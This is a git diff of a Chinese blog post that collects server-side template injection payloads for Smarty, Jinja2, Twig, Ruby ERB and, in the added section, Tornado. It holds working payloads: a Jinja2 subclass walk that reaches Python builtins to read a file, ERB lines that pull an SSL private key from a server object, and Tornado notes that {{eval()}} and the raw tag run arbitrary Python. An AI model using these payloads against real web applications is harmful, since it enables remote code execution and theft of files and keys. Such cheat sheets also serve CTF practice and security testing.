@@ -5,7 +5,7 @@ updated: 2020-04-23 09:42:21
 categories: web
 ---
 
-模板(smart、Flask、jinjia2、TWIG、Ruby/ERB)注入常见payload<!--more-->
+模板(smart、Flask、jinjia2、TWIG、Ruby/ERB、tornado)注入常见payload<!--more-->
 
 ![](https://img.npfs06.top/20210306094545.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
 
@@ -120,9 +120,7 @@ Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()}}{% endif %}{% endfor %}
 ```
 
-```
 
-```
 
 
 
@@ -172,3 +170,45 @@ ruby <%= self.instance_variables %>
 ruby <% ssl=@server.instance_variable_get(:@ssl_context) %><%= ssl.instance_variables %>
 ruby <% ssl = @server.instance_variable_get(:@ssl_context) %><%= ssl.instance_variable_get(:@key) %>   //提取key值
 ```
+
+
+
+
+
+## Tornado
+
+参考链接：https://www.anquanke.com/post/id/244153#h2-4
+
+```
+{{xxx}}
+{%xxx%}
+{#xxx#}
+
+//其中{##}是注释用的，里面的语句不会被执行，而{{}}与{%%}则可以被用来执行命令。
+```
+
+```
+首先是{{}}，这个标签可以说是非常危险，因为它里面可以执行任意的python函数，比如eval函数{{eval("xxx")}}
+```
+
+<img src="http://img.npfs06.top/20210723103123.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />
+
+```
+除了python中的内置函数可以被调用外，还有一些tornado自带的原生类也可以被用来命令执行，可以使用{{globals()}}来查看所有可用的全局变量，如下图所示。
+```
+
+<img src="http://img.npfs06.top/20210723103149.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />
+
+具体有哪些全局变量可以用，哪些变量可以被用来执行命令，各位大佬可以研究研究，我就不列举了。
+
+`{%%}`是`tornado`的另一个标签，它里面的语句受到限制，格式为`{%操作名 参数%}`，操作名在`tornado`的源码中进行了规定，具体源码在`tornado`库中的`template.py`中，以下为从源码中总结出来的所有操作名。
+
+```
+apply、autoescape、block、comment、extends、for、from、if、import、include、module、raw、set、try、while、whitespace
+```
+
+具体操作的意义请自行阅读源码，本文不再赘述，唯独介绍一下`raw` 操作，该操作可以执行原生的python代码。
+
+<img src="http://img.npfs06.top/20210723103221.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;" />
+
+懂我意思吧.jpg，各种python黑魔法走起
